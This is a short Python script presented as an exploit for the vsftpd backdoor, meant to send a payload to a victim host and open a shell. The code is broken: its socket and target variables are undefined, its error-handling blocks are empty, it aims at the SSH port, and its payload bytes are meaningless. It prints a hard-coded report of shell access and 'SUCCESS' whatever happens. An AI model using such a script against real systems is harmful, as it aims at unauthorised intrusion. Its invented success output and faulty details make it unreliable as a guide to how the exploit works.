import socket

target_port = 22

try:
    # Connect

    s.connect((target_ip, target_port))
    
    # Send exploit payload
    exploit_payload = b"\x50\x48\x59\x2d\x31\x32\x0a"  # Backdoor command to trigger shell on victim machine
    s.send(exploit_payload)
    
    # Receive response
    response = s.recv(1024)
    
    # Print detailed results
    print("EXPLOIT: vsftpd backdoor triggered")
    print("COMMAND: ssh -i /dev/null " + target_ip + " /bin/sh")
    print("CREDENTIALS: None")
    print("ACCESS: shell")
    print("STATUS: SUCCESS")
except Exception as e:

finally:
